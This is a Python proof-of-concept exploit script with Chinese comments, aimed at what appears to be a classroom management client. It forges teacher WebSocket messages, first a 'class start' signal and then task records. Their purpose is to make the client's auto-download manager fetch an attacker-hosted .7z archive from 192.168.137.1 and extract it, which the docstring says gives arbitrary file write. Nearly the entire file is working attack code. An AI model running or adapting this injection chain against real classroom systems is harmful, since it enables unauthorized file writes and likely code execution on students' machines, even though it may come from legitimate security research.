# -*- coding: utf-8 -*-
"""inject_startclass.py - 注入 server_tag 的 type=1041000(老师开始上课) + 任务(type=0/2)。
目的: 若能打开 isEndUpClass 闸门 => AutoDownloadManager 会自动下载任务的 zipUrl(我们的 .7z)
      => 下载后 ResourceHelper/Z7Extractor 解压 => 任意写
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
ZIP = "http://%s/poc7z.7z" % OUR


def env(mtype, data, cid, tag="server_tag", cmd=0, frm="teacher"):
    return json.dumps({
        "cmd": cmd, "ct": "", "from": frm, "gt": 0, "cId": cid,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
    }, ensure_ascii=False)


def inj(js, label, wait=10):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    now = int(time.time() * 1000)
    # 1) 老师开始上课(server_tag / type=1041000)
    start = {"classroomId": ROOM, "desktopId": "LAB_D1", "classId": ROOM,
             "status": 2, "attendClass": 1, "classStatus": 2, "time": now}
    inj(env(1041000, json.dumps(start, ensure_ascii=False), "179P00080"), "type=1041000 开始上课", 12)
    # 2) 服务器课堂(server_tag / type=10010)
    inj(env(10010, json.dumps(start, ensure_ascii=False), "179P00081"), "type=10010 服务器课堂", 12)
    # 3) 任务(canvas_tag / type=2 写库 + type=0 广播)
    ri = {"sourceId": "LAB_R1", "taskId": "LAB_T1", "name": "poc7z", "type": 1,
          "zipUrl": ZIP, "createTime": now}
    td = {"taskId": "LAB_T1", "subTaskId": "LAB_S1", "allTaskId": "LAB_T1",
          "classroomId": ROOM, "classroomName": "lab", "desktopId": "LAB_D1",
          "subDesktopId": "LAB_D1", "defaultDesktopId": "LAB_D1",
          "defaultDesktopName": "lab", "sourceId": "LAB_R1",
          "taskStatus": 0, "taskType": 1, "taskCreateMode": 1, "pptSource": 1,
          "isFromPPT": 1, "number": 1, "originTotalNumber": 1, "content": "lab",
          "createTime": now, "expectedSendDate": now, "completed": False,
          "showStatus": 1, "percent": 0, "progress": "0", "positive": 1,
          "negative": 0, "score": 0.0, "studyTime": 0, "viewedIds": "",
          "viewedNum": 0, "resourceInfo": ri}
    js = json.dumps(td, ensure_ascii=False)
    inj(env(2, js, "179P00082", "canvas_tag"), "type=2 任务写库", 10)
    inj(env(0, js, "179P00083", "canvas_tag"), "type=0 任务广播", 10)
    print("done", flush=True)


if __name__ == "__main__":
    main()
